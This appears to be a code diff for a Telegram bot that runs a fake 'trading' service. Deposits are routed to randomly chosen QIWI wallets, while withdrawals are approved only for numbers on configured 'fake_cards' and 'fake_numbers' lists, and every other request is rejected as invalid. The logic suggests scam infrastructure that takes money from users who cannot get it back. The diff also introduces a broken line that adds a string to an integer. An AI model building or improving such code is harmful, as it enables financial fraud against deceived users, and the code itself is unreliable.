@@ -1,4 +1,4 @@
-from random import randint
+from random import choice, randint
 
 from aiogram import types
 from aiogram.dispatcher.storage import FSMContext
@@ -6,8 +6,7 @@ from aiogram.dispatcher.storage import FSMContext
 from data import texts, keyboards
 from data.states import Add, Out
 from loader import config, main_bot
-from qiwiapi import Qiwi
-from qiwiapi.exceptions import InvalidProxy
+from customutils import load_config, save_config
 from models import TradingUser, TradingPayment
 
 
@@ -46,18 +45,15 @@ async def add_amount(message: types.Message, user: TradingUser, state: FSMContex
     if amount < user.min_dep:
         await message.answer(
             texts.add_amount_small.format(
-                min_amount=config.min_deposit,
+                min_amount=user.min_dep,
             )
         )
         return
-    if isinstance(config.qiwi_tokens, list):
-        qiwi = Qiwi(**config.qiwi_tokens[0])
-        try:
-            profile = await qiwi.get_profile()
-        except InvalidProxy:
-            return await message.answer("Ошибка соединения с сервером!")
-        account = profile.contractInfo.contractId
-        comment = randint(1000000, 9999999)
+
+    config = load_config()
+    if config.qiwis:
+        account = choice(config.qiwis).wallet
+        comment = "t" + randint(1000000, 9999999)
         payment = TradingPayment.create(
             owner=user,
             comment=comment,
@@ -81,6 +77,10 @@ async def add_amount(message: types.Message, user: TradingUser, state: FSMContex
             reply_markup=keyboards.main_accept_add_keyboard(payment.id),  # payment id
         )
         await state.finish()
+    else:
+        config.trading_work = False
+        save_config(config)
+
 
 async def out(message: types.Message, user: TradingUser):
     if user.balance < config.trading_min_out:
@@ -95,29 +95,18 @@ async def out(message: types.Message, user: TradingUser):
     )
     await Out.main.set()
 
+
 async def out_number(message: types.Message, user: TradingUser, state: FSMContext):
-    number = message.text.replace("+", "")
-    if number in list(map(lambda x: x[1:], config.fake_numbers)):
+    if (
+        message.text.replace("+", "")
+        in config.fake_cards.russian
+        + config.fake_cards.ukrainian
+        + config.fake_numbers.russian
+        + config.fake_numbers.ukrainian
+    ):
         await message.answer(
             texts.out_request.format(
-                number="+" + number,
-                amount=user.balance,
-            )
-        )
-        await main_bot.send_message(
-            user.owner.cid,
-            texts.main_out_request.format(
-                mention=texts.mention_text.format(user_id=user.cid, text=user.fullname),
-                user_id=user.id,
-                amount=user.balance,
-            ),
-            reply_markup=keyboards.main_accept_out_keyboard(user.id),
-        )
-        await state.finish()
-    elif number in list(map(lambda x: x[1:], config.fake_cards)):
-        await message.answer(
-            texts.out_request.format(
-                number=number,
+                number=message.text,
                 amount=user.balance,
             )
         )
@@ -133,5 +122,3 @@ async def out_number(message: types.Message, user: TradingUser, state: FSMContex
         await state.finish()
     else:
         await message.answer(texts.out_invalid)
-
-
